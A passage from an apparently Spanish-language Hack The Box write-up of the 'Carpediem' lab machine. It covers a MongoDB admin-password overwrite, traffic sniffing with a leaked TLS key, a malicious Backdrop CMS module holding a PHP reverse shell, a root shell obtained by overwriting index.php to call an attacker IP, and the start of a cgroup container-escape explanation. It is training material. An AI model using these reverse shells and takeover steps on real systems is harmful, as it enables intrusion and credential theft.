<span class="go">WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
</span><span class="gp">&gt;</span><span class="w"> </span>db.accounts.find<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"admin"</span><span class="o">})</span>
<span class="gp">{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$</span>2b<span class="nv">$12$J0bmFJhw6gJ3HmSfSLmnb</span>.WbdIMkrhEPzMte.kY9f59GhreFX2vs.<span class="s2">", "</span>fullname<span class="s2">" : "</span>Robert Frost<span class="s2">", "</span>email<span class="s2">" : "</span>rfrost@carpediem.htb<span class="s2">", "</span>role<span class="s2">" : ObjectId("</span>623c8b20855cc5001a8ba138<span class="s2">"), "</span>title<span class="s2">" : "</span>Sr. Network Engineer<span class="s2">", "</span>accessToken<span class="s2">" : "</span>22e56ec0b94db029b07365d520213ef6f5d3d2d9<span class="s2">", "</span>__v<span class="s2">" : 0, "</span>lastOnline<span class="s2">" : ISODate("</span>2022-04-07T20:30:32.198Z<span class="s2">") }
</span></pre></table></code></div></div><p>Ahora volvemos a al subdominio de antes <code class="language-plaintext highlighter-rouge">trudesk.carpediem.htb</code>, nos logeamos como <code class="language-plaintext highlighter-rouge">admin</code> y la contraseña <code class="language-plaintext highlighter-rouge">bestpassword123</code> y logramos entrar</p><p>Para automatizar el proceso podemos crear un script en <code class="language-plaintext highlighter-rouge">javascript</code> que se encargue de actualizar la constraseña:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c1">// get database object</span>
<span class="nx">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mongo</span><span class="p">().</span><span class="nx">getDB</span><span class="p">(</span><span class="dl">'</span><span class="s1">trudesk</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// to specify user</span>
<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nx">new_password</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.</span><span class="dl">"</span> <span class="c1">// bestpassword123</span>

<span class="c1">// view administrator password</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">Old information :</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">cursor</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">accounts</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span>
  <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">username</span>
<span class="p">});</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">cursor</span><span class="p">.</span><span class="nx">hasNext</span><span class="p">())</span> <span class="p">{</span>
  <span class="nx">printjson</span><span class="p">(</span><span class="nx">cursor</span><span class="p">.</span><span class="nx">next</span><span class="p">());</span>
<span class="p">}</span>
<span class="c1">// update administrator password</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">[Password updated!]</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">db</span><span class="p">.</span><span class="nx">accounts</span><span class="p">.</span><span class="nx">update</span><span class="p">({</span> <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">username</span> <span class="p">},</span> 
  <span class="p">{</span> <span class="na">$set</span><span class="p">:</span> <span class="p">{</span>
      <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">new_password</span>
   <span class="p">}</span>
<span class="p">});</span>
<span class="c1">// verify new password</span>
<span class="nx">print</span><span class="p">(</span><span class="dl">"</span><span class="s2">New information :</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">cursor</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">accounts</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span>
  <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span> <span class="p">:</span> <span class="nx">username</span>
<span class="p">});</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">cursor</span><span class="p">.</span><span class="nx">hasNext</span><span class="p">())</span> <span class="p">{</span>
  <span class="nx">printjson</span><span class="p">(</span><span class="nx">cursor</span><span class="p">.</span><span class="nx">next</span><span class="p">());</span>
<span class="p">}</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Para ejecutarlo solo se lo pasamos como parámetro a <code class="language-plaintext highlighter-rouge">mongo</code> y se ejecutará automáticamente</p></div></blockquote><blockquote class="prompt-info"><div><p>Este script y los anteriores los puedes encontrar en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Carpediem/change_adminpass">https://github.com/E1P0TR0</a></p></div></blockquote><blockquote class="prompt-info"><div><p>Aquí mas información sobre la actualización de datos en <strong>mondodb</strong> <a href="https://www.mongodb.com/docs/manual/reference/operator/update/set/">https://www.mongodb.com/docs/manual/reference/operator/update/set/</a></p></div></blockquote><p>Una vez dentro nos encontramos con la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/carpediem/trudesk_admin_web.png" alt="trudeskWeb" class="shadow" data-proofer-ignore></p><p>Después de enumerar cada sección, nos encontramos una sobre los diferentes <strong>tickets</strong> del equipo. Aquí encontramos información enlazada a las vulnerabilidades que explotamos anteriormente</p><p>Hay un solo ticket que nos manda <code class="language-plaintext highlighter-rouge">Adeanna Cooke</code> sobre el ingreso de un nuevo Ingeniero de Redes, el cúal necesita que configuren sus credenciales y teléfono. Entonces nosotros como usuario <code class="language-plaintext highlighter-rouge">Robert Frost</code> nos comprometemos a hacer dicha tarea:</p><p><img data-src="/assets/img/htb/writeups/carpediem/trudesk_ticket.png" alt="trudeskTicket" class="shadow" data-proofer-ignore></p><p>Revisando la conversación se habla del sistema <strong>VoIP</strong>, acrónimo de Voz sobre Protocolo de Internet (Voice Over Internet Protocol). También menciona que le dejo por <strong>mensaje de voz</strong> la credenciales de este nuevo empleado. Además hablan sobre una aplicación <code class="language-plaintext highlighter-rouge">Zoiper</code>, el cuál es un software multiplataforma diseñado para trabajar con sus sistemas de comunicación IP basado en el protocolo SIP (lo que mencionamos anteriormente).</p><p>Como todo va tomando relación, buscando en internet sobre esta aplicación y logramos descargala con éxito:</p><p><img data-src="/assets/img/htb/writeups/carpediem/zoiper_app.png" alt="zoiperAPP" class="shadow" data-proofer-ignore></p><p>Observamos que necesitamos un usuario y contraseña. Esta parte es cuestión de relacionar la información y pensar un poco. Luego de ello y analizando bien la conversación podemos deducir las credenciales: <code class="language-plaintext highlighter-rouge">9650@carpediem.htb:2022</code> (hostname: carpediem.htb)</p><p>Una vez dentro marcamos en la interfaz <code class="language-plaintext highlighter-rouge">*62</code> para escuchar nuestra bandeja de mensajes de voz y con ello nuestra contraseña del servidor: <code class="language-plaintext highlighter-rouge">AuRj4pxq9qPk</code></p><p><img data-src="/assets/img/htb/writeups/carpediem/zoiper_voicemail.png" alt="zoiperVoicemail" class="shadow" data-proofer-ignore></p><p>Ahora podemos usar esas credencial para intenrar logearnos por <strong>SSH</strong>, con el usuario <code class="language-plaintext highlighter-rouge">hflaccus</code> (del nombre Horacio Flaccus que se mencionaba en los mensajes, y la abreviación siguiendo el patrón de los demás usuarios). Una vez dentro logramos conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="go">❯ sshpass -p 'AuRj4pxq9qPk' ssh hflaccus@10.10.11.167
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 06 Sep 2022 05:01:49 AM UTC

  System load:  0.1               Processes:                256
  Usage of /:   73.3% of 9.46GB   Users logged in:          0
  Memory usage: 29%               IPv4 address for docker0: 172.17.0.1 &lt;--- we confirm docker again!
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.167

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

</span><span class="gp">hflaccus@carpediem:~$</span><span class="w"> </span>find / <span class="nt">-name</span> flag.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">total 4
-rw-r----- 1 root hflaccus 33 Sep  6 04:48 user.txt
</span></pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con un reconocimiento básico del sistema listando el <strong>sistema operativo, la distribución, las interfaces de red, etc</strong>. Como usuario listamos si tenemos <strong>binarios para ejecutar como sudo o binarios SUID del sistema</strong>. No encontramos algo interesante, así que tirando de <strong>Linpeas</strong> (herramienta para enumeración en Linux para escalar privilegios) encontramos cosas interesantes:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">hflaccus@carpediem:/tmp$</span><span class="w"> </span>./linpeas.sh <span class="o">&gt;</span> linpeas_enumeration
<span class="c">...
</span><span class="go">══╣ Possible private SSH keys were found!
/etc/ssl/certs/backdrop.carpediem.htb.key
</span><span class="c">...
</span><span class="go">╔══════════╣ Capabilities
</span><span class="gp">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#</span>capabilities
<span class="go">Current env capabilities:
Current: =
Current proc capabilities:                                                                                                                                            CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000                                                                                                                                              
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:  
0x0000000000000000=

Files with capabilities (limited to 50):                                              
/usr/bin/ping = cap_net_raw+ep                                                        
/usr/bin/mtr-packet = cap_net_raw+ep                                                  
/usr/bin/traceroute6.iputils = cap_net_raw+ep                                         
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip &lt;---- sniffing
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
</span><span class="c">...
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar <code class="language-plaintext highlighter-rouge">linpeas</code> en su repositorio <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p></div></blockquote><p>Encontramos una llave privada del dominio <em>backdrop.carpediem.htb</em> y además las <strong>capabilities</strong> para poder usar el binario <code class="language-plaintext highlighter-rouge">tcpdump</code>, que en pocas palabras sirve para olfatear/analizar tráfico en una comunicación.</p><blockquote><p>¿ Qué son <strong>capabilities</strong> ?</p><p>Son atributos especiales en el <strong>Kernel</strong> de Linux que dividen los privilegios disponibles para los procesos que se ejecutan como usuario <strong>root</strong> en grupos mas pequeños de privilegios</p></blockquote><p>Existe una lista de <strong>capabilities</strong> que podemos asignar a cada usuario</p><p>Cada <strong>capability</strong> puede tener 3 valores:</p><ol><li><strong>P(permitted)</strong>: Marca la capability como habilitada. Ahora esta podrá tener el valor de <em>Effective</em> o <em>Inheritable</em><li><strong>E(Effective)</strong>: Aplica la capability al proceso definido<li><strong>I(Inheritable)</strong>: La pueden heredar los subprocesos</ol><p>Entonces ya podemos tener mas claro esto:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip &lt;-- e + i + p (habilitada, efectiva y heredable)
                          \             \_________ use RAW and PACKET sockets, etc
                           \______________________ Perform various network-related operations, etc
</span></pre></table></code></div></div><p>Con respecto al nuevo dominio, lo agregamos nuevamente a nuestro <em>/etc/hosts</em> y nos redirige a la primera página. Sin embargo, si recordamos nuestra <strong>enumeración de hosts</strong>, recordamos que teniamos varias interfaces:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre># portDiscovery.sh 

Host discovery:

Host 172.17.0.1: UP.
Host 172.17.0.4: UP.
Host 172.17.0.2: UP.
Host 172.17.0.6: UP.
Host 172.17.0.5: UP.
Host 172.17.0.3: UP.

Port discovery:

Host 172.17.0.1: &lt;--- Host machine (carpediem.htb / 10.10.11.167)
        Port 80: OPEN
        Port 22: OPEN
Host 172.17.0.2: &lt;-- MongoDB
        Port 27017: OPEN
Host 172.17.0.3: &lt;-- MySQL
        Port 3306: OPEN 
        Port 33060: OPEN 
Host 172.17.0.4: &lt;--- ?
        Port 21: OPEN 
        Port 80: OPEN 
        Port 443: OPEN 
Host 172.17.0.5: &lt;--- trudesk.carpediem.htb
        Port 8118: OPEN 
Host 172.17.0.6: &lt;--- porta.carpediem.htb
        Port 80: OPEN
</pre></table></code></div></div><p>Observamos que nos falta saber que servicios corren por la interfaz <code class="language-plaintext highlighter-rouge">172.17.0.4</code>. Por <strong>FTP(21)</strong> no encontramos información, veamos los de los servicios web:</p><p>Ya que tenemos conexión con esa interfaz, usamos <code class="language-plaintext highlighter-rouge">curl</code> para ver la data por el protocolo <strong>HTTP(80)</strong> y encontramos la página por defecto del servidor web <strong>Apache</strong>. Sin embargo, por el protocolo <strong>HTTPS(443)</strong> encontramos el CMS en php <code class="language-plaintext highlighter-rouge">Backdrop</code> (Content Management System)</p><p>Entonces, para poder visualizar la interfaz tenemos que aplicar un <strong>redireccionamiento de puerto local</strong> para traer ese puerto <strong>443</strong> de la máquina <code class="language-plaintext highlighter-rouge">172.17.0.4</code> a nuestro puerto <strong>443</strong> local. Podemos usar <code class="language-plaintext highlighter-rouge">chisel</code>, pero ya que tenemos conexión con la máquina por <strong>SSH(hflaccus)</strong>, creamos un <strong>tunel por SSH</strong> para hacer la conexión de puertos:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">❯ ssh -L localhost:443:172.17.0.4:443 hflaccus@10.10.11.167                           
</span><span class="c">...
</span><span class="go">
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ ss -tulnp | grep 443
tcp   LISTEN 0      128                         127.0.0.1:443        0.0.0.0:*    users:(("ssh",pid=112335,fd=5))         
tcp   LISTEN 0      128                             [::1]:443           [::]:*    users:(("ssh",pid=112335,fd=4))
</span></pre></table></code></div></div><p>Entrando a la interfaz encontramos un panel de login:</p><p><img data-src="/assets/img/htb/writeups/carpediem/backdrop_web.png" alt="backdropWeb" class="shadow" data-proofer-ignore></p><p>Podemos enumerar usuarios con la lista que teniamos ya que nos muestra un panel de respuesta de la existencia de un usuario. De la base de datos <code class="language-plaintext highlighter-rouge">Mongodb</code> tenemos algunos nombres de usuarios, y el único válido es <code class="language-plaintext highlighter-rouge">jpardella</code></p><blockquote class="prompt-warning"><div><p>Ten cuidado al realizar ataques de fuerza bruta, ya que lo intenté y te bloquea la <strong>IP</strong></p></div></blockquote><p>El siguiente paso es intentar conseguir la contraseña del usuario <code class="language-plaintext highlighter-rouge">jpardella</code> de esta web. Y ya que podemos hacer <strong>sniffing</strong> gracias a las <strong>capabilities</strong> vistas anteriormente, usamos el binario <code class="language-plaintext highlighter-rouge">tcpdumb</code> para interceptar el tráfico por cualquier interfaz de red por el puerto <strong>443</strong>, luego de unos minutos guardamos esa captura y lo trasladamos a nuestra máquina para analizarla con <code class="language-plaintext highlighter-rouge">Wireshark</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">hflaccus@carpediem:~$</span><span class="w"> </span>tcpdump <span class="nt">-i</span> any port 443 <span class="nt">-w</span> capture.pcap
<span class="go">tcpdump: listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes
^C732 packets captured
732 packets received by filter
0 packets dropped by kernel
</span></pre></table></code></div></div><p>Ya que el tráfico es por el protocolo <strong>TLS(Transport Layer Security)</strong>, veremos que está encriptado y no podemos extraer algún tipo de información por el protocolo <strong>HTTPS</strong></p><p>Por ello, usaremos la llave privada que encontramos para el dominio <code class="language-plaintext highlighter-rouge">backdrop.carpediem.htb</code> que es justamente el de la web donde queremos extraer credenciales del panel de login. Entonces insertamos la llave en las configuraciones de <code class="language-plaintext highlighter-rouge">Wireshark</code> (Edit/Preferences/Protocols/TLS), filtramos por el protocolo <strong>HTTP</strong> y encontraremos la data del panel de <strong>Login</strong>:</p><p><img data-src="/assets/img/htb/writeups/carpediem/sniffing_web.png" alt="sniffingWeb" class="shadow" data-proofer-ignore></p><p>Con las credenciales entramos en la web y tenemos la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/carpediem/backdrop_http.png" alt="backdropWEB" class="shadow" data-proofer-ignore></p><p>Despues de revisar la web y no encontrar algo interesante, buscando en internet <strong>vulnerabilidades del CMS Backdrop</strong>, encontramos un <strong>CSRF(Cross-Site Request Forgery)</strong>, el cúal consiste en la explotación de un recurso por parte de un usuario en el cual el <strong>sitio web confía</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45268">CVE-2021-45268</a></p><p><img data-src="/assets/img/htb/writeups/carpediem/CVE-2021-45268_concept.png" alt="CVE-2021-45268" class="shadow" data-proofer-ignore></p><p>La explotación consiste en subir código malicioso por medio de un plugin. Para ello necesitamos permisos administradores, el cual obviamente tenemos como <code class="language-plaintext highlighter-rouge">jpardella</code>:</p><blockquote><p>Primero necesitamos crear un plugin con las características necesarias de <strong>Backdrop</strong></p><p>Por defecto un plugin/módulo necesita los archivos <em>.info</em> y <em>.module</em></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">───────┬────────────────────────────────────────
       │ File: rce.info
───────┼────────────────────────────────────────
   1   │ name = shell
   2   │ description = remote code execution
   3   │ backdrop = 1.x
   4   │ type = module
───────┴────────────────────────────────────────
───────┬────────────────────────────────────────
</span><span class="gp">       │ File: rce.module   &lt;EMPTY&gt;</span><span class="w">
</span><span class="go">───────┴────────────────────────────────────────
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Los campos especificados en cada archivo son obligatorios (menos la descripción) paraque sean recnocidos como un módulo</p></div></blockquote><blockquote><p>Con esto listo ahora necesitamos agregar le archivo malicioso, en esta ocasión una <strong>Shell reversa en php</strong></p></blockquote><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">];</span>

  <span class="nv">$command</span> <span class="o">=</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">/1234 0&gt;&amp;1'"</span><span class="p">;</span>
  <span class="nb">exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Por último metemos todos estos archivos en una carpeta de nombre X y lo comprimimos en un archivo formato <code class="language-plaintext highlighter-rouge">.tar</code></p><blockquote class="prompt-warning"><div><p>Es importante que los archivos X.info, X.module y la carpeta donde las coloques para comprimirlos tengan el mismo nombre (rce en mi caso)</p></div></blockquote><blockquote class="prompt-info"><div><p>Esta plantilla la puedes encontrar en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Carpediem/module_www-data.2">https://github.com/E1P0TR0</a></p></div></blockquote><p>Con esto listo, solo subes el comprimido, lo buscas en la ruta de <em>/uploads</em>, lo ejecutas y ya tenemos acceso al aquipo <code class="language-plaintext highlighter-rouge">172.17.0.2 (backdrop.carpediem.htb)</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.167:52002.
bash: cannot set terminal process group (280): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
www-data
</span><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$</span><span class="w"> </span><span class="nb">hostname</span>
<span class="go">hostname
90c7f522b842
</span><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop/modules/rce$</span><span class="w"> </span><span class="nb">hostname</span> <span class="nt">-I</span>
<span class="go">hostname -I
172.17.0.2
</span></pre></table></code></div></div><p>Seguimos en un contenedor como usuario <code class="language-plaintext highlighter-rouge">www-data</code>. Haciendo un reconocimiento del sistema listamos procesos que se ejecuten como <code class="language-plaintext highlighter-rouge">root</code> y encontramos el script <code class="language-plaintext highlighter-rouge">/opt/hearbeat.sh</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="c">#Run a site availability check every 10 seconds via cron</span>
<span class="nv">checksum</span><span class="o">=(</span><span class="si">$(</span>/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh<span class="si">)</span><span class="o">)</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$checksum</span> <span class="o">!=</span> <span class="s2">"70a121c0202a33567101e2330c069b34"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">exit
</span><span class="k">fi
</span><span class="nv">status</span><span class="o">=</span><span class="si">$(</span>php /var/www/html/backdrop/core/scripts/backdrop.sh <span class="nt">--root</span> /var/www/html/backdrop https://localhost<span class="si">)</span>
<span class="nb">grep</span> <span class="s2">"Welcome to backdrop.carpediem.htb!"</span> <span class="s2">"</span><span class="nv">$status</span><span class="s2">"</span>
<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$?</span><span class="s2">"</span> <span class="o">!=</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        <span class="c">#something went wrong.  restoring from backup.</span>
        <span class="nb">cp</span> /root/index.php /var/www/html/backdrop/index.php
<span class="k">fi</span>

</pre></table></code></div></div><p>Tenemos una tarea <strong>Cron</strong> que se ejecutara cada 10 segundos donde ejecutará el script <code class="language-plaintext highlighter-rouge">backdrop.sh</code> del servicio web. Investigando sobre los archivos del CMS <strong>Backdrop</strong> encontramos que sirve <strong>ejecutar scripts del CMS Backdrop</strong> que se encuentren en la ruta raiz de tu web.</p><p>Examinando el código en <code class="language-plaintext highlighter-rouge">php</code> observamos que se incluye el archivo <code class="language-plaintext highlighter-rouge">index.php</code> como variable por defecto, y si existe, usará el término <code class="language-plaintext highlighter-rouge">include</code> (que añade archivo php al archivo actual y lo ejecuta) y lo ejecutará. Ya que somo el usuario <code class="language-plaintext highlighter-rouge">www-data</code> y tenemos permisos para modificar archivos de la web, entonces modificamos ese archivo con código malicioso <strong>(Reverse shell)</strong> y conseguimos ser el usuario <code class="language-plaintext highlighter-rouge">root</code> del contenedor:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop$</span><span class="w"> </span><span class="nb">ls</span>            
<span class="go">LICENSE.txt  README.md  core  files  index.php  layouts  modules  robots.txt  settings.php  sites  themes
</span><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop$</span><span class="w"> </span><span class="nv">cmd</span><span class="o">=</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.62/5555 0&gt;&amp;1'"</span>
<span class="gp">www-data@90c7f522b842:/var/www/html/backdrop$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"&lt;?php exec(</span><span class="se">\"</span><span class="nv">$cmd</span><span class="se">\"</span><span class="s2">); ?&gt;"</span> <span class="o">&gt;</span> index.php
<span class="gp">www-data@90c7f522b842:/var/www/html/backdrop$</span><span class="w"> </span><span class="nb">cat </span>index.php 
<span class="gp">&lt;?php exec("bash -c 'bash -i &gt;</span>&amp; /dev/tcp/10.10.14.62/5555 0&gt;&amp;1<span class="s1">'"); ?&gt;
</span><span class="gp">www-data@90c7f522b842:/var/www/html/backdrop$</span><span class="w"> 
</span><span class="go">
───────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 5555
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:36566.
bash: cannot set terminal process group (21608): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@90c7f522b842:/var/www/html/backdrop#</span><span class="w"> 
</span></pre></table></code></div></div><p>Ya como <code class="language-plaintext highlighter-rouge">root</code> en el contenedor, investigando <strong>como escapar de contenedores</strong> encontramos una vulnerabilidad muy interesante de este año <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0492">CVE-2022-0492</a></p><p>En mi caso me costó entenderlo a la perfección ya que es la primera vez que toco el tema de <strong>Contenedores y monturas</strong></p><p>En resumen, cuando estamos en un contenedor hacemos uso de <strong>cgroups</strong>, lo cuál es una característica de Linux que usa <strong>Docker</strong> para aislar sus contenedores y los recursos usados por sus respectivos procesos. Los <strong>cgroups</strong> se administran en un sistema de archivos montado. Estos <strong>cgroups</strong> se dividen en <em>subsistemas</em>, donde cada uno de estos configura el acceso a un recurso direfente (memory cgroup, device cgroup, etc). A cada <strong>cgroup</strong> creado puedes agregarle procesos, etc.</p><p>Lo importante aquí es el archivo <em>release_agent</em> de <strong>cgroups</strong>, el cúal plos administradores pueden configurar un programa para ejecutarse al terminar un proceso en el respectivo <strong>cgroup</strong>. Además, para habilitar esta característica debemos activar el archivo <em>notify_on_release</em></p><p>Para modificar estos archivos necesitamos un 